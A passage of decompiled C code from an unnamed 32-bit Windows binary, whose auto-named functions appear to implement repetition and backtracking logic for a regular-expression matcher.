  piVar5 = (int *)FUN_0040c014(*(void **)(uVar3 + 0x20),8);
  if (piVar5 != (int *)0x0) {
    *piVar5 = iVar1;
    piVar5[1] = param_1;
  }
  uVar2 = *(undefined4 *)((int)this + 4);
  *(undefined4 *)(uVar3 + 0x10) = uVar2;
  return CONCAT31((int3)((uint)uVar2 >> 8),1);
}



uint __thiscall FUN_0040ffb9(void *this,uint param_1)

{
  int iVar1;
  undefined4 uVar2;
  uint uVar3;
  uint uVar4;
  int *piVar5;
  
  uVar3 = param_1;
  param_1 = 0;
  iVar1 = *(int *)(uVar3 + 8);
  uVar4 = FUN_0040d2cf(*(void **)((int)this + 8),uVar3);
  if ((char)uVar4 == '\0') {
    if (*(int *)((int)this + 0xc) != 0) {
LAB_00410045:
      return uVar4 & 0xffffff00;
    }
  }
  else if (*(int *)(uVar3 + 8) == iVar1) {
    param_1 = *(uint *)((int)this + 0x10);
  }
  else if (*(uint *)((int)this + 0xc) == 0) {
    *(int *)(uVar3 + 8) = iVar1;
  }
  else {
    param_1 = 1;
    if (1 < *(uint *)((int)this + 0xc)) {
      do {
        uVar4 = FUN_0040d2cf(*(void **)((int)this + 8),uVar3);
        if ((char)uVar4 == '\0') {
          *(int *)(uVar3 + 8) = iVar1;
          goto LAB_00410045;
        }
        param_1 = param_1 + 1;
      } while (param_1 < *(uint *)((int)this + 0xc));
    }
  }
  piVar5 = (int *)FUN_0040c014(*(void **)(uVar3 + 0x20),8);
  if (piVar5 != (int *)0x0) {
    *piVar5 = iVar1;
    piVar5[1] = param_1;
  }
  uVar2 = *(undefined4 *)((int)this + 4);
  *(undefined4 *)(uVar3 + 0x10) = uVar2;
  return CONCAT31((int3)((uint)uVar2 >> 8),1);
}



uint __thiscall FUN_00410049(void *this,int param_1)

{
  int iVar1;
  undefined4 uVar2;
  void *local_c;
  void *local_8;
  
  local_c = this;
  local_8 = this;
  iVar1 = FUN_004146d8(*(int *)(param_1 + 0x20));
  if ((*(int *)(iVar1 + 4) != *(int *)((int)this + 0x10)) &&
     (uVar2 = FUN_0040d29a(*(void **)((int)this + 8),param_1), (char)uVar2 != '\0')) {
    *(int *)(iVar1 + 4) = *(int *)(iVar1 + 4) + 1;
    uVar2 = *(undefined4 *)((int)this + 4);
    *(undefined4 *)(param_1 + 0x10) = uVar2;
    return CONCAT31((int3)((uint)uVar2 >> 8),1);
  }
  local_c = (void *)0x0;
  local_8 = (void *)0x0;
  FUN_0041473a(*(void **)(param_1 + 0x20),&local_c);
  *(void **)(param_1 + 8) = local_c;
  return (uint)local_c & 0xffffff00;
}



uint __thiscall FUN_004100aa(void *this,int param_1)

{
  int iVar1;
  undefined4 uVar2;
  void *local_c;
  void *local_8;
  
  local_c = this;
  local_8 = this;
  iVar1 = FUN_004146d8(*(int *)(param_1 + 0x20));
  if ((*(int *)(iVar1 + 4) != *(int *)((int)this + 0x10)) &&
     (uVar2 = FUN_0040d2cf(*(void **)((int)this + 8),param_1), (char)uVar2 != '\0')) {
    *(int *)(iVar1 + 4) = *(int *)(iVar1 + 4) + 1;
    uVar2 = *(undefined4 *)((int)this + 4);
    *(undefined4 *)(param_1 + 0x10) = uVar2;
    return CONCAT31((int3)((uint)uVar2 >> 8),1);
  }
  local_c = (void *)0x0;
  local_8 = (void *)0x0;
  FUN_0041473a(*(void **)(param_1 + 0x20),&local_c);
  *(void **)(param_1 + 8) = local_c;
  return (uint)local_c & 0xffffff00;
}



uint __thiscall FUN_0041010b(void *this,int param_1,char *param_2)

{
  char *pcVar1;
  uint in_EAX;
  undefined4 uVar2;
  uint uVar3;
  int local_8;
  
  pcVar1 = param_2;
  uVar3 = 0;
  local_8 = 0;
  if ((*(int *)((int)this + 0x10) != 0) &&
     (in_EAX = FUN_0040d46e(*(void **)((int)this + 8),param_1,&param_2), (char)in_EAX != '\0')) {
    local_8 = (int)pcVar1 - (int)param_2;
    if (local_8 == 0) {
      uVar2 = (**(code **)**(undefined4 **)((int)this + 4))(param_1,param_2);
      return uVar2;
    }
    uVar3 = 1;
    if (1 < *(uint *)((int)this + 0x10)) {
      do {
        in_EAX = FUN_0040d46e(*(void **)((int)this + 8),param_1,&param_2);
        if ((char)in_EAX == '\0') break;
        uVar3 = uVar3 + 1;
      } while (uVar3 < *(uint *)((int)this + 0x10));
    }
  }
  if (uVar3 < *(uint *)((int)this + 0xc)) {
LAB_00410194:
    uVar3 = in_EAX & 0xffffff00;
  }
  else {
    while (in_EAX = (**(code **)**(undefined4 **)((int)this + 4))(param_1,param_2),
          (char)in_EAX == '\0') {
      if (*(uint *)((int)this + 0xc) == uVar3) goto LAB_00410194;
      uVar3 = uVar3 - 1;
      param_2 = param_2 + local_8;
    }
    uVar3 = CONCAT31((int3)(in_EAX >> 8),1);
  }
  return uVar3;
}



uint __thiscall FUN_0041019d(void *this,undefined4 param_1,char *param_2)

{
  char *pcVar1;
  uint in_EAX;
  undefined4 uVar2;
  uint uVar3;
  int local_8;
  
  pcVar1 = param_2;
  uVar3 = 0;
  local_8 = 0;
  if ((*(int *)((int)this + 0x10) != 0) &&
     (in_EAX = FUN_0040d494(*(void **)((int)this + 8),param_1,&param_2), (char)in_EAX != '\0')) {
    local_8 = (int)pcVar1 - (int)param_2;
    if (local_8 == 0) {
      uVar2 = (**(code **)(**(int **)((int)this + 4) + 4))(param_1,param_2);
      return uVar2;
    }
    uVar3 = 1;
    if (1 < *(uint *)((int)this + 0x10)) {
      do {
        in_EAX = FUN_0040d494(*(void **)((int)this + 8),param_1,&param_2);
        if ((char)in_EAX == '\0') break;
        uVar3 = uVar3 + 1;
      } while (uVar3 < *(uint *)((int)this + 0x10));
    }
  }
  if (uVar3 < *(uint *)((int)this + 0xc)) {
LAB_00410228:
    uVar3 = in_EAX & 0xffffff00;
  }
  else {
    while (in_EAX = (**(code **)(**(int **)((int)this + 4) + 4))(param_1,param_2),
          (char)in_EAX == '\0') {
      if (*(uint *)((int)this + 0xc) == uVar3) goto LAB_00410228;
      uVar3 = uVar3 - 1;
      param_2 = param_2 + local_8;
    }
    uVar3 = CONCAT31((int3)(in_EAX >> 8),1);
  }
  return uVar3;
}



uint __thiscall FUN_00410231(void *this,int param_1)

{
  undefined4 uVar1;
  uint *puVar2;
  uint uVar3;
  uint uVar4;
  
  uVar4 = 0;
  uVar3 = *(uint *)(param_1 + 8);
  if (*(int *)((int)this + 0x10) != 0) {
    uVar1 = FUN_0040d4b3(*(void **)((int)this + 8),param_1);
    if ((char)uVar1 != '\0') {
      if (*(uint *)(param_1 + 8) == uVar3) {
        uVar4 = *(uint *)((int)this + 0xc);
      }
      else {
        uVar4 = 1;
        if (1 < *(uint *)((int)this + 0x10)) {
          do {
            uVar1 = FUN_0040d4b3(*(void **)((int)this + 8),param_1);
            if ((char)uVar1 == '\0') break;
            uVar4 = uVar4 + 1;
          } while (uVar4 < *(uint *)((int)this + 0x10));
        }
      }
    }
  }
  if (uVar4 < *(uint *)((int)this + 0xc)) {
    *(uint *)(param_1 + 8) = uVar3;
    uVar3 = uVar3 & 0xffffff00;
  }
  else {
    puVar2 = (uint *)FUN_0040c014(*(void **)(param_1 + 0x20),8);
    if (puVar2 != (uint *)0x0) {
      *puVar2 = uVar3;
      puVar2[1] = uVar4;
    }
    uVar1 = *(undefined4 *)((int)this + 4);
    *(undefined4 *)(param_1 + 0x10) = uVar1;
    uVar3 = CONCAT31((int3)((uint)uVar1 >> 8),1);
  }
  return uVar3;
}



uint __thiscall FUN_004102b2(void *this,int param_1)

{
  undefined4 uVar1;
  uint *puVar2;
  uint uVar3;
  uint uVar4;
  
  uVar4 = 0;
  uVar3 = *(uint *)(param_1 + 8);
  if (*(int *)((int)this + 0x10) != 0) {
    uVar1 = FUN_0040d4dd(*(void **)((int)this + 8),param_1);
    if ((char)uVar1 != '\0') {
      if (*(uint *)(param_1 + 8) == uVar3) {
        uVar4 = *(uint *)((int)this + 0xc);
      }
      else {
        uVar4 = 1;
        if (1 < *(uint *)((int)this + 0x10)) {
          do {
            uVar1 = FUN_0040d4dd(*(void **)((int)this + 8),param_1);
            if ((char)uVar1 == '\0') break;
            uVar4 = uVar4 + 1;
          } while (uVar4 < *(uint *)((int)this + 0x10));
        }
      }
    }
  }
  if (uVar4 < *(uint *)((int)this + 0xc)) {
    *(uint *)(param_1 + 8) = uVar3;
    uVar3 = uVar3 & 0xffffff00;
  }
  else {
    puVar2 = (uint *)FUN_0040c014(*(void **)(param_1 + 0x20),8);
    if (puVar2 != (uint *)0x0) {
      *puVar2 = uVar3;
      puVar2[1] = uVar4;
    }
    uVar1 = *(undefined4 *)((int)this + 4);
    *(undefined4 *)(param_1 + 0x10) = uVar1;
    uVar3 = CONCAT31((int3)((uint)uVar1 >> 8),1);
  }
  return uVar3;
}



uint __thiscall FUN_00410333(void *this,int param_1)

{
  undefined4 uVar1;
  int iVar2;
  uint uVar3;
  void *local_c;
  void *local_8;
  
  local_c = this;
  local_8 = this;
  iVar2 = FUN_004146d8(*(int *)(param_1 + 0x20));
  if (*(int *)((int)this + 0xc) == *(int *)(iVar2 + 4)) {
    local_c = (void *)0x0;
    local_8 = (void *)0x0;
    FUN_0041473a(*(void **)(param_1 + 0x20),&local_c);
    *(void **)(param_1 + 8) = local_c;
    uVar3 = (uint)local_c & 0xffffff00;
  }
  else {
    *(int *)(iVar2 + 4) = *(int *)(iVar2 + 4) + -1;
    *(int *)(param_1 + 8) = *(int *)(param_1 + 8) + -1;
    uVar1 = *(undefined4 *)((int)this + 4);
    *(undefined4 *)(param_1 + 0x10) = uVar1;
    uVar3 = CONCAT31((int3)((uint)uVar1 >> 8),1);
  }
  return uVar3;
}



void __thiscall FUN_00410387(void *this,undefined8 *param_1,undefined4 param_2)

{
  int *piVar1;
  undefined8 uVar2;
  undefined local_1c [8];
  int local_14;
  int local_10;
  int local_c;
  undefined4 local_8;
  
  piVar1 = (int *)(**(code **)(**(int **)((int)this + 8) + 0x2c))(local_1c,param_2);
  local_14 = *piVar1;
  local_10 = piVar1[1];
  local_c = *(int *)((int)this + 0xc);
  local_8 = *(undefined4 *)((int)this + 0x10);
  uVar2 = FUN_0040833e(&local_14,&local_c);
  *param_1 = uVar2;
  return;
}



uint __thiscall FUN_004103d4(void *this,int param_1,char *param_2)

{
  uint uVar1;
  undefined4 uVar2;
  uint uVar3;
  char *local_8;
  
  local_8 = param_2;
  uVar3 = 0;
  uVar1 = FUN_0040d46e(*(void **)((int)this + 8),param_1,&local_8);
  if ((char)uVar1 == '\0') {
    if (*(int *)((int)this + 0xc) != 0) goto LAB_0041046a;
  }
  else {
    if (local_8 == param_2) {
      uVar2 = (**(code **)**(undefined4 **)((int)this + 4))(param_1,param_2);
      return uVar2;
    }
    uVar1 = *(uint *)((int)this + 0xc);
    if (uVar1 != 0) {
      param_2 = local_8;
    }
    uVar3 = (uint)(uVar1 != 0);
    if (uVar3 < uVar1) {
      do {
        uVar1 = FUN_0040d46e(*(void **)((int)this + 8),param_1,&param_2);
        if ((char)uVar1 == '\0') goto LAB_0041046a;
        uVar3 = uVar3 + 1;
      } while (uVar3 < *(uint *)((int)this + 0xc));
    }
  }
  do {
    uVar1 = (**(code **)**(undefined4 **)((int)this + 4))(param_1,param_2);
    if ((char)uVar1 != '\0') {
      return CONCAT31((int3)(uVar1 >> 8),1);
    }
    if (*(uint *)((int)this + 0x10) <= uVar3) break;
    uVar3 = uVar3 + 1;
    uVar1 = FUN_0040d46e(*(void **)((int)this + 8),param_1,&param_2);
  } while ((char)uVar1 != '\0');
LAB_0041046a:
  return uVar1 & 0xffffff00;
}



uint __thiscall FUN_00410473(void *this,undefined4 param_1,char *param_2)

{
  uint uVar1;
  undefined4 uVar2;
  uint uVar3;
  char *local_8;
  
  local_8 = param_2;
  uVar3 = 0;
  uVar1 = FUN_0040d494(*(void **)((int)this + 8),param_1,&local_8);
  if ((char)uVar1 == '\0') {
    if (*(int *)((int)this + 0xc) != 0) goto LAB_0041050b;
  }
  else {
    if (local_8 == param_2) {
      uVar2 = (**(code **)(**(int **)((int)this + 4) + 4))(param_1,param_2);
      return uVar2;
    }
    uVar1 = *(uint *)((int)this + 0xc);
    if (uVar1 != 0) {
      param_2 = local_8;
    }
    uVar3 = (uint)(uVar1 != 0);
    if (uVar3 < uVar1) {
      do {
        uVar1 = FUN_0040d494(*(void **)((int)this + 8),param_1,&param_2);
        if ((char)uVar1 == '\0') goto LAB_0041050b;
        uVar3 = uVar3 + 1;
      } while (uVar3 < *(uint *)((int)this + 0xc));
    }
  }
  do {
    uVar1 = (**(code **)(**(int **)((int)this + 4) + 4))(param_1,param_2);
    if ((char)uVar1 != '\0') {
      return CONCAT31((int3)(uVar1 >> 8),1);
    }
    if (*(uint *)((int)this + 0x10) <= uVar3) break;
    uVar3 = uVar3 + 1;
    uVar1 = FUN_0040d494(*(void **)((int)this + 8),param_1,&param_2);
  } while ((char)uVar1 != '\0');
LAB_0041050b:
  return uVar1 & 0xffffff00;
}



uint __thiscall FUN_00410514(void *this,uint param_1)

{
  int iVar1;
  undefined4 uVar2;
  uint uVar3;
  uint uVar4;
  int *piVar5;
  
  uVar3 = param_1;
  param_1 = 0;
  iVar1 = *(int *)(uVar3 + 8);
  uVar4 = FUN_0040d4b3(*(void **)((int)this + 8),uVar3);
  if ((char)uVar4 == '\0') {
    if (*(int *)((int)this + 0xc) != 0) {
LAB_004105a0:
      return uVar4 & 0xffffff00;
    }
  }
  else if (*(int *)(uVar3 + 8) == iVar1) {
    param_1 = *(uint *)((int)this + 0x10);
  }
  else if (*(uint *)((int)this + 0xc) == 0) {
    *(int *)(uVar3 + 8) = iVar1;
  }
  else {
    param_1 = 1;
    if (1 < *(uint *)((int)this + 0xc)) {
      do {
        uVar4 = FUN_0040d4b3(*(void **)((int)this + 8),uVar3);
        if ((char)uVar4 == '\0') {
          *(int *)(uVar3 + 8) = iVar1;
          goto LAB_004105a0;
        }
        param_1 = param_1 + 1;
      } while (param_1 < *(uint *)((int)this + 0xc));
    }
  }
  piVar5 = (int *)FUN_0040c014(*(void **)(uVar3 + 0x20),8);
  if (piVar5 != (int *)0x0) {
    *piVar5 = iVar1;
    piVar5[1] = param_1;
  }
  uVar2 = *(undefined4 *)((int)this + 4);
  *(undefined4 *)(uVar3 + 0x10) = uVar2;
  return CONCAT31((int3)((uint)uVar2 >> 8),1);
}



uint __thiscall FUN_004105a4(void *this,uint param_1)

{
  int iVar1;
  undefined4 uVar2;
  uint uVar3;
  uint uVar4;
  int *piVar5;
  
  uVar3 = param_1;
  param_1 = 0;
  iVar1 = *(int *)(uVar3 + 8);
  uVar4 = FUN_0040d4dd(*(void **)((int)this + 8),uVar3);
  if ((char)uVar4 == '\0') {
    if (*(int *)((int)this + 0xc) != 0) {
LAB_00410630:
      return uVar4 & 0xffffff00;
    }
  }
  else if (*(int *)(uVar3 + 8) == iVar1) {
    param_1 = *(uint *)((int)this + 0x10);
  }
  else if (*(uint *)((int)this + 0xc) == 0) {
    *(int *)(uVar3 + 8) = iVar1;
  }
  else {
    param_1 = 1;
    if (1 < *(uint *)((int)this + 0xc)) {
      do {
        uVar4 = FUN_0040d4dd(*(void **)((int)this + 8),uVar3);
        if ((char)uVar4 == '\0') {
          *(int *)(uVar3 + 8) = iVar1;
          goto LAB_00410630;
        }
        param_1 = param_1 + 1;
      } while (param_1 < *(uint *)((int)this + 0xc));
    }
  }
  piVar5 = (int *)FUN_0040c014(*(void **)(uVar3 + 0x20),8);
  if (piVar5 != (int *)0x0) {
    *piVar5 = iVar1;
    piVar5[1] = param_1;
  }
  uVar2 = *(undefined4 *)((int)this + 4);
  *(undefined4 *)(uVar3 + 0x10) = uVar2;
  return CONCAT31((int3)((uint)uVar2 >> 8),1);
}



uint __thiscall FUN_00410634(void *this,int param_1)

{
  int iVar1;
  undefined4 uVar2;
  void *local_c;
  void *local_8;
  
  local_c = this;
  local_8 = this;
  iVar1 = FUN_004146d8(*(int *)(param_1 + 0x20));
  if ((*(int *)(iVar1 + 4) != *(int *)((int)this + 0x10)) &&
     (uVar2 = FUN_0040d4b3(*(void **)((int)this + 8),param_1), (char)uVar2 != '\0')) {
    *(int *)(iVar1 + 4) = *(int *)(iVar1 + 4) + 1;
    uVar2 = *(undefined4 *)((int)this + 4);
    *(undefined4 *)(param_1 + 0x10) = uVar2;
    return CONCAT31((int3)((uint)uVar2 >> 8),1);
  }
  local_c = (void *)0x0;
  local_8 = (void *)0x0;
  FUN_0041473a(*(void **)(param_1 + 0x20),&local_c);
  *(void **)(param_1 + 8) = local_c;
  return (uint)local_c & 0xffffff00;
}



uint __thiscall FUN_00410695(void *this,int param_1)

{
  int iVar1;
  undefined4 uVar2;
  void *local_c;
  void *local_8;
  
  local_c = this;
  local_8 = this;
  iVar1 = FUN_004146d8(*(int *)(param_1 + 0x20));
  if ((*(int *)(iVar1 + 4) != *(int *)((int)this + 0x10)) &&
     (uVar2 = FUN_0040d4dd(*(void **)((int)this + 8),param_1), (char)uVar2 != '\0')) {
    *(int *)(iVar1 + 4) = *(int *)(iVar1 + 4) + 1;
    uVar2 = *(undefined4 *)((int)this + 4);
    *(undefined4 *)(param_1 + 0x10) = uVar2;
    return CONCAT31((int3)((uint)uVar2 >> 8),1);
  }
  local_c = (void *)0x0;
  local_8 = (void *)0x0;
  FUN_0041473a(*(void **)(param_1 + 0x20),&local_c);
  *(void **)(param_1 + 8) = local_c;
  return (uint)local_c & 0xffffff00;
}



uint __thiscall FUN_004106f6(void *this,int param_1,char *param_2)

{
  char *pcVar1;
  uint in_EAX;
  undefined4 uVar2;
  uint uVar3;
  int local_8;
  
  pcVar1 = param_2;
  uVar3 = 0;
  local_8 = 0;
  if ((*(int *)((int)this + 0x10) != 0) &&
     (in_EAX = FUN_0041445c(*(void **)((int)this + 8),param_1,&param_2), (char)in_EAX != '\0')) {
    local_8 = (int)pcVar1 - (int)param_2;
    if (local_8 == 0) {
      uVar2 = (**(code **)**(undefined4 **)((int)this + 4))(param_1,param_2);
      return uVar2;
    }
    uVar3 = 1;
    if (1 < *(uint *)((int)this + 0x10)) {
      do {
        in_EAX = FUN_0041445c(*(void **)((int)this + 8),param_1,&param_2);
        if ((char)in_EAX == '\0') break;
        uVar3 = uVar3 + 1;
      } while (uVar3 < *(uint *)((int)this + 0x10));
    }
  }
  if (uVar3 < *(uint *)((int)this + 0xc)) {
LAB_00410785:
    uVar3 = in_EAX & 0xffffff00;
  }
  else {
    while (in_EAX = (**(code **)**(undefined4 **)((int)this + 4))(param_1,param_2),
          (char)in_EAX == '\0') {
      if (*(uint *)((int)this + 0xc) == uVar3) goto LAB_00410785;
      uVar3 = uVar3 - 1;
      param_2 = param_2 + local_8;
    }
    uVar3 = CONCAT31((int3)(in_EAX >> 8),1);
  }
  return uVar3;
}



uint __thiscall FUN_0041078e(void *this,undefined4 param_1,char *param_2)

{
  char *pcVar1;
  uint in_EAX;
  undefined4 uVar2;
  uint uVar3;
  int local_8;
  
  pcVar1 = param_2;
  uVar3 = 0;
  local_8 = 0;
  if ((*(int *)((int)this + 0x10) != 0) &&
     (in_EAX = FUN_00414487(*(void **)((int)this + 8),param_1,&param_2), (char)in_EAX != '\0')) {
    local_8 = (int)pcVar1 - (int)param_2;
    if (local_8 == 0) {
      uVar2 = (**(code **)(**(int **)((int)this + 4) + 4))(param_1,param_2);
      return uVar2;
    }
    uVar3 = 1;
    if (1 < *(uint *)((int)this + 0x10)) {
      do {
        in_EAX = FUN_00414487(*(void **)((int)this + 8),param_1,&param_2);
        if ((char)in_EAX == '\0') break;
        uVar3 = uVar3 + 1;
      } while (uVar3 < *(uint *)((int)this + 0x10));
    }
  }
  if (uVar3 < *(uint *)((int)this + 0xc)) {
LAB_0041081f:
    uVar3 = in_EAX & 0xffffff00;
  }
  else {
    while (in_EAX = (**(code **)(**(int **)((int)this + 4) + 4))(param_1,param_2),
          (char)in_EAX == '\0') {
      if (*(uint *)((int)this + 0xc) == uVar3) goto LAB_0041081f;
      uVar3 = uVar3 - 1;
      param_2 = param_2 + local_8;
    }
    uVar3 = CONCAT31((int3)(in_EAX >> 8),1);
  }
  return uVar3;
}



uint __thiscall FUN_00410828(void *this,char *param_1)

{
  char *pcVar1;
  void *pvVar2;
  undefined4 uVar3;
  char *pcVar4;
  uint uVar5;
  char **ppcVar6;
  
  pcVar4 = param_1;
  param_1 = (char *)0x0;
  pcVar1 = *(char **)(pcVar4 + 8);
  ppcVar6 = (char **)(pcVar4 + 8);
  if (*(int *)((int)this + 0x10) != 0) {
    pvVar2 = *(void **)((int)this + 8);
    *(undefined4 *)(pcVar4 + 0x10) = *(undefined4 *)((int)pvVar2 + 4);
    uVar5 = FUN_0041445c(pvVar2,(int)pcVar4,ppcVar6);
    if ((char)uVar5 != '\0') {
      if (*ppcVar6 == pcVar1) {
        param_1 = *(char **)((int)this + 0xc);
      }
      else {
        param_1 = (char *)0x1;
        if (1 < *(uint *)((int)this + 0x10)) {
          do {
            pvVar2 = *(void **)((int)this + 8);
            *(undefined4 *)(pcVar4 + 0x10) = *(undefined4 *)((int)pvVar2 + 4);
            uVar5 = FUN_0041445c(pvVar2,(int)pcVar4,ppcVar6);
            if ((char)uVar5 == '\0') break;
            param_1 = param_1 + 1;
          } while (param_1 < *(char **)((int)this + 0x10));
        }
      }
    }
  }
  if (param_1 < *(char **)((int)this + 0xc)) {
    *ppcVar6 = pcVar1;
    uVar5 = (uint)pcVar1 & 0xffffff00;
  }
  else {
    ppcVar6 = (char **)FUN_0040c014(*(void **)(pcVar4 + 0x20),8);
    if (ppcVar6 != (char **)0x0) {
      *ppcVar6 = pcVar1;
      ppcVar6[1] = param_1;
    }
    uVar3 = *(undefined4 *)((int)this + 4);
    *(undefined4 *)(pcVar4 + 0x10) = uVar3;
    uVar5 = CONCAT31((int3)((uint)uVar3 >> 8),1);
  }
  return uVar5;
}



uint __thiscall FUN_004108d3(void *this,char *param_1)

{
  char *pcVar1;
  void *pvVar2;
  undefined4 uVar3;
  char *pcVar4;
  uint uVar5;
  char **ppcVar6;
  
  pcVar4 = param_1;
  param_1 = (char *)0x0;
  pcVar1 = *(char **)(pcVar4 + 8);
  ppcVar6 = (char **)(pcVar4 + 8);
  if (*(int *)((int)this + 0x10) != 0) {
    pvVar2 = *(void **)((int)this + 8);
    *(undefined4 *)(pcVar4 + 0x10) = *(undefined4 *)((int)pvVar2 + 4);
    uVar5 = FUN_00414487(pvVar2,pcVar4,ppcVar6);
    if ((char)uVar5 != '\0') {
      if (*ppcVar6 == pcVar1) {
        param_1 = *(char **)((int)this + 0xc);
      }
      else {
        param_1 = (char *)0x1;
        if (1 < *(uint *)((int)this + 0x10)) {
          do {
            pvVar2 = *(void **)((int)this + 8);
            *(undefined4 *)(pcVar4 + 0x10) = *(undefined4 *)((int)pvVar2 + 4);
            uVar5 = FUN_00414487(pvVar2,pcVar4,ppcVar6);
            if ((char)uVar5 == '\0') break;
            param_1 = param_1 + 1;
          } while (param_1 < *(char **)((int)this + 0x10));
        }
      }
    }
  }
  if (param_1 < *(char **)((int)this + 0xc)) {
    *ppcVar6 = pcVar1;
    uVar5 = (uint)pcVar1 & 0xffffff00;
  }
  else {
    ppcVar6 = (char **)FUN_0040c014(*(void **)(pcVar4 + 0x20),8);
    if (ppcVar6 != (char **)0x0) {
      *ppcVar6 = pcVar1;
      ppcVar6[1] = param_1;
    }
    uVar3 = *(undefined4 *)((int)this + 4);
    *(undefined4 *)(pcVar4 + 0x10) = uVar3;
    uVar5 = CONCAT31((int3)((uint)uVar3 >> 8),1);
  }
  return uVar5;
}



uint __thiscall FUN_0041099e(void *this,int param_1,char *param_2)

{
  uint uVar1;
  undefined4 uVar2;
  uint uVar3;
  char *local_8;
  
  local_8 = param_2;
  uVar3 = 0;
  uVar1 = FUN_0041445c(*(void **)((int)this + 8),param_1,&local_8);
  if ((char)uVar1 == '\0') {
    if (*(int *)((int)this + 0xc) != 0) goto LAB_00410a3d;
  }
  else {
    if (local_8 == param_2) {
      uVar2 = (**(code **)**(undefined4 **)((int)this + 4))(param_1,param_2);
      return uVar2;
    }
    uVar1 = *(uint *)((int)this + 0xc);
    if (uVar1 != 0) {
      param_2 = local_8;
    }
    uVar3 = (uint)(uVar1 != 0);
    if (uVar3 < uVar1) {
      do {
        uVar1 = FUN_0041445c(*(void **)((int)this + 8),param_1,&param_2);
        if ((char)uVar1 == '\0') goto LAB_00410a3d;
        uVar3 = uVar3 + 1;
      } while (uVar3 < *(uint *)((int)this + 0xc));
    }
  }
  do {
    uVar1 = (**(code **)**(undefined4 **)((int)this + 4))(param_1,param_2);
    if ((char)uVar1 != '\0') {
      return CONCAT31((int3)(uVar1 >> 8),1);
    }
    if (*(uint *)((int)this + 0x10) <= uVar3) break;
    uVar3 = uVar3 + 1;
    uVar1 = FUN_0041445c(*(void **)((int)this + 8),param_1,&param_2);
  } while ((char)uVar1 != '\0');
LAB_00410a3d:
  return uVar1 & 0xffffff00;
}



uint __thiscall FUN_00410a46(void *this,undefined4 param_1,char *param_2)

{
  uint uVar1;
  undefined4 uVar2;
  uint uVar3;
  char *local_8;
  
  local_8 = param_2;
  uVar3 = 0;
  uVar1 = FUN_00414487(*(void **)((int)this + 8),param_1,&local_8);
  if ((char)uVar1 == '\0') {
    if (*(int *)((int)this + 0xc) != 0) goto LAB_00410ae7;
  }
  else {
    if (local_8 == param_2) {
      uVar2 = (**(code **)(**(int **)((int)this + 4) + 4))(param_1,param_2);
      return uVar2;
    }
    uVar1 = *(uint *)((int)this + 0xc);
    if (uVar1 != 0) {
      param_2 = local_8;
    }
    uVar3 = (uint)(uVar1 != 0);
    if (uVar3 < uVar1) {
      do {
        uVar1 = FUN_00414487(*(void **)((int)this + 8),param_1,&param_2);
        if ((char)uVar1 == '\0') goto LAB_00410ae7;
        uVar3 = uVar3 + 1;
      } while (uVar3 < *(uint *)((int)this + 0xc));
    }
  }
  do {
    uVar1 = (**(code **)(**(int **)((int)this + 4) + 4))(param_1,param_2);
    if ((char)uVar1 != '\0') {
      return CONCAT31((int3)(uVar1 >> 8),1);
    }
    if (*(uint *)((int)this + 0x10) <= uVar3) break;
    uVar3 = uVar3 + 1;
    uVar1 = FUN_00414487(*(void **)((int)this + 8),param_1,&param_2);
  } while ((char)uVar1 != '\0');
LAB_00410ae7:
  return uVar1 & 0xffffff00;
}



uint __thiscall FUN_00410af0(void *this,char *param_1)

{
  char *pcVar1;
  void *pvVar2;
  undefined4 uVar3;
  char *pcVar4;
  char *pcVar5;
  char **ppcVar6;
  uint uVar7;
  
  pcVar4 = param_1;
  param_1 = (char *)0x0;
  pcVar1 = *(char **)(pcVar4 + 8);
  pvVar2 = *(void **)((int)this + 8);
  ppcVar6 = (char **)(pcVar4 + 8);
  *(undefined4 *)(pcVar4 + 0x10) = *(undefined4 *)((int)pvVar2 + 4);
  pcVar5 = (char *)FUN_0041445c(pvVar2,(int)pcVar4,ppcVar6);
  if ((char)pcVar5 == '\0') {
    if (*(int *)((int)this + 0xc) != 0) {
LAB_00410b9d:
      return (uint)pcVar5 & 0xffffff00;
    }
  }
  else if (*ppcVar6 == pcVar1) {
    param_1 = *(char **)((int)this + 0x10);
  }
  else if (*(uint *)((int)this + 0xc) == 0) {
    *ppcVar6 = pcVar1;
  }
  else {
    param_1 = (char *)0x1;
    if (1 < *(uint *)((int)this + 0xc)) {
      do {
        pvVar2 = *(void **)((int)this + 8);
        *(undefined4 *)(pcVar4 + 0x10) = *(undefined4 *)((int)pvVar2 + 4);
        uVar7 = FUN_0041445c(pvVar2,(int)pcVar4,ppcVar6);
        if ((char)uVar7 == '\0') {
          *ppcVar6 = pcVar1;
          pcVar5 = pcVar1;
          goto LAB_00410b9d;
        }
        param_1 = param_1 + 1;
      } while (param_1 < *(char **)((int)this + 0xc));
    }
  }
  ppcVar6 = (char **)FUN_0040c014(*(void **)(pcVar4 + 0x20),8);
  if (ppcVar6 != (char **)0x0) {
    *ppcVar6 = pcVar1;
    ppcVar6[1] = param_1;
  }
  uVar3 = *(undefined4 *)((int)this + 4);
  *(undefined4 *)(pcVar4 + 0x10) = uVar3;
  return CONCAT31((int3)((uint)uVar3 >> 8),1);
}



uint __thiscall FUN_00410ba1(void *this,char *param_1)

{
  char *pcVar1;
  void *pvVar2;
  undefined4 uVar3;
  char *pcVar4;
  char *pcVar5;
  char **ppcVar6;
  uint uVar7;
  
  pcVar4 = param_1;
  param_1 = (char *)0x0;
  pcVar1 = *(char **)(pcVar4 + 8);
  pvVar2 = *(void **)((int)this + 8);
  ppcVar6 = (char **)(pcVar4 + 8);
  *(undefined4 *)(pcVar4 + 0x10) = *(undefined4 *)((int)pvVar2 + 4);
  pcVar5 = (char *)FUN_00414487(pvVar2,pcVar4,ppcVar6);
  if ((char)pcVar5 == '\0') {
    if (*(int *)((int)this + 0xc) != 0) {
LAB_00410c4e:
      return (uint)pcVar5 & 0xffffff00;
    }
  }
  else if (*ppcVar6 == pcVar1) {
    param_1 = *(char **)((int)this + 0x10);
  }
  else if (*(uint *)((int)this + 0xc) == 0) {
    *ppcVar6 = pcVar1;
  }
  else {
    param_1 = (char *)0x1;
    if (1 < *(uint *)((int)this + 0xc)) {
      do {
        pvVar2 = *(void **)((int)this + 8);
        *(undefined4 *)(pcVar4 + 0x10) = *(undefined4 *)((int)pvVar2 + 4);
        uVar7 = FUN_00414487(pvVar2,pcVar4,ppcVar6);
        if ((char)uVar7 == '\0') {
          *ppcVar6 = pcVar1;
          pcVar5 = pcVar1;
          goto LAB_00410c4e;
        }
        param_1 = param_1 + 1;
      } while (param_1 < *(char **)((int)this + 0xc));
    }
  }
  ppcVar6 = (char **)FUN_0040c014(*(void **)(pcVar4 + 0x20),8);
  if (ppcVar6 != (char **)0x0) {
